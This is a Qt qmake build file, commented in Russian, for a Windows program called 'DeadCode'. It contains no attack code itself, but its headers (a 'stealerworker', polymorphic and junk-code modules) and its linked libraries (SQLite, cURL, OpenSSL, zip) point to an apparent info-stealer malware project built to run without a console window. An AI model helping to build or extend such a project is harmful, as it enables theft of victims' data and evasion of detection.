# Основные модули Qt
QT += core gui network widgets qml quick

# Указываем минимальную версию Qt
requires(qtConfig(version >= 5.15))

TARGET = DeadCode
TEMPLATE = app

# Конфигурация для релиза (динамическая сборка Qt)
CONFIG += release

# Указываем спецификацию для MinGW
QMAKE_SPEC = win32-g++

# Исходные файлы
SOURCES += \
    $$PWD/../src/main.cpp \
    $$PWD/mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    $$PWD/mainwindow.h \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h

# Формы Qt Designer
FORMS += \
    $$PWD/mainwindow.ui

# Файл ресурсов (ручная обработка)
RC_FILE = $$PWD/../icon.rc

# Пути для поиска заголовков
# Используем переменные окружения для гибкости (для CI и локальной сборки)
VCPKG_INCLUDE_DIR = $$(VCPKG_ROOT)/installed/x64-mingw-dynamic/include
isEmpty(VCPKG_INCLUDE_DIR):VCPKG_INCLUDE_DIR = C:/vcpkg/installed/x64-mingw-dynamic/include

QT_DIR = $$(QT_ROOT)
isEmpty(QT_DIR):QT_DIR = C:/Qt/5.15.2/mingw90_64

INCLUDEPATH += \
    $$PWD/../src \
    $$PWD \
    $$VCPKG_INCLUDE_DIR \
    $$QT_DIR/include

# Пути для поиска QML-модулей (используется Qt Creator для автодополнения)
# Для runtime нужно установить QML2_IMPORT_PATH в переменных окружения
QML_IMPORT_PATH += \
    $$QT_DIR/qml

# Библиотеки для линковки
VCPKG_LIB_DIR = $$(VCPKG_ROOT)/installed/x64-mingw-dynamic/lib
isEmpty(VCPKG_LIB_DIR):VCPKG_LIB_DIR = C:/vcpkg/installed/x64-mingw-dynamic/lib

LIBS += -L$$VCPKG_LIB_DIR \
        -lsqlite3 \      # SQLite для работы с базами данных
        -lzip \          # Libzip для работы с архивами
        -lzlib \         # Zlib для сжатия
        -lbz2 \          # Bzip2 для сжатия
        -lcurl \         # cURL для сетевых запросов
        -lssl \          # OpenSSL для шифрования
        -lcrypto \       # OpenSSL (криптография)
        -lstdc++fs \     # Поддержка <filesystem> из C++17
        # Системные библиотеки Windows
        -lws2_32 \       # Для сетевых функций (требуется curl)
        -lcrypt32 \      # Для криптографии (требуется openssl)
        -lgdi32 \        # Для графики (требуется Qt)
        -luser32 \       # Для работы с окнами (требуется Qt)
        -ladvapi32       # Для системных функций (требуется openssl)

# Флаги компилятора
QMAKE_CXXFLAGS += \
    -O2 \                        # Оптимизация уровня 2
    -std=c++17 \                 # Стандарт C++17 (требуется для <filesystem>)
    -Wall \                      # Включить все предупреждения
    -Wextra \                    # Дополнительные предупреждения
    -Werror=return-type \        # Ошибка при отсутствии return
    -fexceptions \               # Поддержка исключений
    -DUNICODE \                  # Поддержка Unicode
    -D_UNICODE \                 # Поддержка Unicode
    -DWIN32 \                    # Определение для Windows
    -DQT_NO_DEBUG \              # Отключение отладочных макросов Qt
    -D_CRT_SECURE_NO_WARNINGS \  # Отключение предупреждений о небезопасных функциях
    -Wno-deprecated-declarations \ # Подавление предупреждений о deprecated
    -Wno-cast-function-type \    # Подавление предупреждений о приведениях типов функций
    -Wno-unused-parameter \      # Подавление предупреждений о неиспользуемых параметрах
    -Wno-sign-compare \          # Подавление предупреждений о сравнении знаковых/беззнаковых типов
    -Wno-attributes              # Подавление предупреждений об атрибутах (синхронизация с build.yml)

# Флаги линковщика
QMAKE_LFLAGS += \
    -O2 \                        # Оптимизация уровня 2
    -Wl,-subsystem,windows \     # Указываем подсистему Windows (без консоли)
    -Wl,--allow-multiple-definition  # Разрешить множественные определения (для совместимости)

# Директории для сборки
DESTDIR = $$PWD/../build/release
OBJECTS_DIR = $$PWD/../build/release
MOC_DIR = $$PWD/../build/release
UI_DIR = $$PWD/../build/release
RCC_DIR = $$PWD/../build/release

# Расширенный список файлов для очистки
QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe \
    $$OBJECTS_DIR/*.o \
    $$MOC_DIR/moc_*.cpp \
    $$UI_DIR/ui_*.h \
    $$RCC_DIR/qrc_*.cpp

# Настройки для Windows
win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g           # Добавляем отладочные символы
        QMAKE_LFLAGS -= -O2            # Отключаем оптимизацию для отладки
        DESTDIR = $$PWD/../build/debug
        OBJECTS_DIR = $$PWD/../build/debug
        MOC_DIR = $$PWD/../build/debug
        UI_DIR = $$PWD/../build/debug
        RCC_DIR = $$PWD/../build/debug
        QMAKE_CLEAN += \
            $$DESTDIR/DeadCode.exe \
            $$OBJECTS_DIR/*.o \
            $$MOC_DIR/moc_*.cpp \
            $$UI_DIR/ui_*.h \
            $$RCC_DIR/qrc_*.cpp
    }
}

# Зависимости для пересборки
PRE_TARGETDEPS += \
    $$PWD/../src/build_key.h \
    $$PWD/../src/polymorphic_code.h \
    $$PWD/../src/junk_code.h \
    $$PWD/../src/stealerworker.h \
    $$PWD/../src/compat.h

# Поддержка параллельной сборки (например, -j4)
QMAKE_MAKEFLAGS += -j4